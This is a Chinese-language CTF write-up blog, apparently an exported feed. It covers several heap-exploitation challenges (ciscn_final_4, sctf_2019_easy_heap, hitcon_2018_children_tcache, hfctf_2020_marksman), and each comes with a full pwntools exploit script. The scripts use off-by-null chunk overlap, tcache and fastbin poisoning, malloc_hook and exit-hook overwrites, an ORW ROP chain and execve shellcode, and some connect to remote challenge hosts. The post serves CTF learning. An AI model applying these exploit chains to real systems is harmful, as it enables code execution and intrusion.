<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000400B2F&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content?&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;what is your name?&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;sc&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#3</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span> <br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br><br><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x90</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x110</span><br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000417</span> + libc_base <br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p64(heap_base + <span class="hljs-number">0x240</span>) + p64(ret)) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0xf8</span>,rop) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#add(3,)</span><br>add(<span class="hljs-number">0x60</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext))<br>free(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb0</span>))<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="五、sctf-2019-easy-heap"><a href="#五、sctf-2019-easy-heap" class="headerlink" title="五、sctf_2019_easy_heap"></a>五、sctf_2019_easy_heap</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211024164932819.png"><span class="image-caption">image-20211024164932819</span></p>
<p>漏洞点在于输入函数，存在offbynull，因此构造overlap</p>
<p>这题问题点在于构造overlap时，要进行合并的头堆块和尾堆块中间要夹着至少两个堆块（一个堆块会报错，刚开始我就一直卡着）。</p>
<p>然后对于libc的利用，因为unsorted bin上的libc地址距离malloc_hook地址很接近，只相差一个字节的内容，所以在制造了overlap后，申请堆块时注意，让被覆盖的fd指针上被写入libc地址，然后修改一字节内容即可。这样程序即是没有打印函数也无关紧要。</p>
<p>然后只要把堆块申请到mmap的地址上，然后把地址写入hook函数执行shellcode即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_easy_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27234</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Address 0x&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;Mmap: 0x&quot;</span>)<br>shell_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;shell_addr==&gt;0x%x&quot;</span> %shell_addr)<br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x4f0</span>)<br>add(<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x470</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x440</span>)<br>add(<span class="hljs-number">0x510</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0x31</span>) + p64(shell_addr) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  # 0x68732f6e69622f --&gt; hs/nib/  little endian</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp </span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi, esi               # rsi低32位</span><br><span class="hljs-string">    xor edx, edx               # rdx低32位</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span>   )<br>edit(<span class="hljs-number">3</span>,shellcode + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x30&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">6</span>,p64(shell_addr) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="六、hitcon-2018-children-tcache"><a href="#六、hitcon-2018-children-tcache" class="headerlink" title="六、hitcon_2018_children_tcache"></a>六、hitcon_2018_children_tcache</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211030181121619.png"><span class="image-caption">image-20211030181121619</span></p>
<p>常规checksec，保护全开</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030181304288.png"><span class="image-caption">image-20211030181304288</span></p>
<p>漏洞点在于申请功能里面的strcpy这个函数，把你内容复制过去时会自动在末尾加一个’\x00’，所以当填满数据时，造成了offbynull漏洞。</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030181437290.png"><span class="image-caption">image-20211030181437290</span></p>
<p>这题特殊在释放函数会先对堆块的内容填入你<code>写入 size </code>的大小的垃圾数据，这个是你写入的size，这个很重要</p>
<p>其次就是没有写功能，所以只能依赖于申请功能里面附带的写数据来实现写入。</p>
<p>利用：</p>
<p>​    因为是offbynull漏洞，那目的一定是要制造出堆块重叠的。泄露libc因为有着strcpy函数，所以会多个’\x00’截断问题，所以只能在制造出overlap时才能打印出libc地址。那么所有重心都在制造出overlap</p>
<p>这边要注意，因为是glibc-2.27版本，所以堆块是要申请入0x4f8这样的，不会被放入tcache里面，才能实现合并。然后就是pre_size位置的填充一定要把那个八个字节的内容都要填满才行</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030181946581.png"><span class="image-caption">image-20211030181946581</span></p>
<p>这样写，才能溢出一个’\x00’</p>
<p>然后我们就要去修正前面为了占位置的垃圾的数据了，这边我用的是a这个字符。清空是用了前面强调的delete填充垃圾数据是根据我们申请堆块时候写进去的size填充的，所以如果我们依次减少一个字节申请数量，然后再填满我们申请的大小，借用strcpy溢出的’\x00’来逐个去清空前面为了修改pre_inuse位而填入的a</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030182245802.png"><span class="image-caption">image-20211030182245802</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030182305126.png"><span class="image-caption">image-20211030182305126</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030182359347.png"><span class="image-caption">image-20211030182359347</span></p>
<p>最后就能全部清零，成功伪造出pre_inuse，后面就是常规的构造overlap，最后把one_gadget写入malloc_hook里面getshell</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211030182527290.png"><span class="image-caption">image-20211030182527290</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HITCON_2018_children_tcache&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25931</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<br>    p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>j = <span class="hljs-number">6</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x28</span>-i,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">&#x27;\x60\x05&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*j)<br>    j = j - <span class="hljs-number">1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(mlh))<br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x28</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x60</span>))<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a>hfctf_2020_marksman</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211104212411070.png"><span class="image-caption">image-20211104212411070</span></p>
<p>64位，保护全开，而且运行了一下，题目给了小礼物：libc地址</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106145934254.png"><span class="image-caption">image-20211106145934254</span></p>
<p>而且程序很简单，可以看见，v6输入一个值，显然是输入一个地址的，然后底下可以修改三个字节内容，所以要getshell肯定是要想办法利用这三个字节把某个会被调用的libc内容修改为one_gadget，但是要想修改内容就要先通过check</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106145902768.png"><span class="image-caption">image-20211106145902768</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106150044423.png"><span class="image-caption">image-20211106150044423</span></p>
<p>check里面不允许写入一些字节，可以发现这些字节就是one_gadget的字节，也就是说是不允许直接写入这些one_gadget的。所以要转换一下思路</p>
<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>利用IDA查看这些one_gadget，去看看这些地址的上方有没有其他不会影响的操作，然后把地址修改为该地址，最终也会执行到one_gadget</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106150346116.png"><span class="image-caption">image-20211106150346116</span></p>
<p>比如这个one_gadget，在上面是一个执行close的函数指令，显然是不会影响到one_gadget的，所以可以把这个地址作为修改地址，我们可以修改exit的__rtld_lock_unlock_recursive，这也是一个类似hook函数的东西，exit退出时会被执行到。所以可以修改这里的内容</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106153902758.png"><span class="image-caption">image-20211106153902758</span></p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106160251870.png"><span class="image-caption">image-20211106160251870</span></p>
<p>另外值得注意的点(我踩坑了)：这边的v6是用atol转换出来的，所以输入时直接用str转为字符串输入，如果使用p64打包，会变成16进制数，atol会识别不了，直接返回0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hfctf_2020_marksman&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28590)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x809c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x10a387</span><br>log.info(<span class="hljs-string">&quot;ogg==&gt;0x%x&quot;</span> %ogg)<br>exit_hook = libc_base + <span class="hljs-number">0x81cf60</span><br>p.sendlineafter(<span class="hljs-string">&quot;shoot!shoot!\n&quot;</span>,<span class="hljs-built_in">str</span>(exit_hook))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8(ogg&amp;<span class="hljs-number">0xFF</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8((ogg&amp;<span class="hljs-number">0xFF00</span>)&gt;&gt;<span class="hljs-number">8</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;biang!\n&quot;</span>, p8((ogg&amp;<span class="hljs-number">0xFF0000</span>)&gt;&gt;<span class="hljs-number">16</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p><img src="/2021/09/05/2021-09-05-buu08/image-20211106154641512.png"><span class="image-caption">image-20211106154641512</span></p>
<p>禁用的只是常见的one_gadget，可以增加参数<code>--level 2</code>查看更多的one_gadget，但是约束更多，而其中上图圈出的也是可以getshell的one_gadget</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106161834320.png"><span class="image-caption">image-20211106161834320</span></p>
<p>另一个可以修改为one_gadget的地方就在不断追踪dlopen这个函数时，可以发现，在_dlerror_run+96的地址调用_dl_catch_error@plt</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106162708556.png"><span class="image-caption">image-20211106162708556</span>    </p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106163050236.png"><span class="image-caption">image-20211106163050236</span></p>
<p>把这里的got表内容修改为one_gadget即可，没具体写exp，但是过程已经详细说明</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20211106163226205.png"><span class="image-caption">image-20211106163226205</span></p>
<p>当然前提是RELRO没开全，允许修改libc里面的got表</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯PWN</title>
    <url>/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp</p>
<p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p>
<p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png"><span class="image-caption">image-20210903160536437</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p>进入IDA看看，程序很简单，就不细说了。主要说下漏洞点</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png"><span class="image-caption">image-20210903160656584</span></p>
<p>在修改功能函数里面，存在scanf(buf)，存在格式化字符串漏洞，然后这边的要去计算偏移，一定要去相应版本的Ubuntu下去动态调试，我刚开始是在20.04下调试，偏移不对。然后这边调试技巧：因为程序开pie了，所以我们可以先输入start指令，会断在开头，这时候可以获取当前的pie，才能断点在相应的位置</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png"><span class="image-caption">image-20210903161041335</span></p>
